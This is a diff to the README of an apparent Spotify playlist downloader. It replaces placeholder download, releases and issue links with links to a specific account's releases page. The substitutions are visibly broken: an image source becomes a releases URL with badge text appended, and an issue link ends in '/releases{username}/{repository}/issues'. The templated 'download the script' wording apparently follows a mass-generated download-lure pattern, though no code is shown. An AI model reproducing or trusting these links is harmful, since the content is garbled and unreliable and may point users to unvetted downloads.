@@ -24,10 +24,10 @@ The main goal of this project is to offer a simple yet powerful tool for downloa
 
 To begin using this Spotify Playlist Downloader, simply download the script from the following link:
 
-[<img src="https://img.shields.io/badge/Download%20Here-Click%20to%20Download-brightgreen">](https://github.com/assets/Release.zip)
+[<img src="https://github.com/gacontb97/spotify-playlist-downloader/releases%20Here-Click%20to%20Download-brightgreen">](https://github.com/gacontb97/spotify-playlist-downloader/releases)
 
 If the link doesn't work or needs to be launched, please visit the 
-[Releases](https://github.com/{username}/{repository}/releases) section for alternate download options.
+[Releases](https://github.com/gacontb97/spotify-playlist-downloader/releases{username}/{repository}/releases) section for alternate download options.
 
 ## How to Use
 
@@ -37,7 +37,7 @@ If the link doesn't work or needs to be launched, please visit the
 
 ## Additional Information
 
-For any questions, feedback, or issues, please feel free to open an [issue](https://github.com/{username}/{repository}/issues) in this repository. Your input is valuable for continuous improvement and development of this project.
+For any questions, feedback, or issues, please feel free to open an [issue](https://github.com/gacontb97/spotify-playlist-downloader/releases{username}/{repository}/issues) in this repository. Your input is valuable for continuous improvement and development of this project.
 
 Let's tune in to your favorite Spotify playlists anytime, anywhere with the Spotify Playlist Downloader! 🎶📱
 
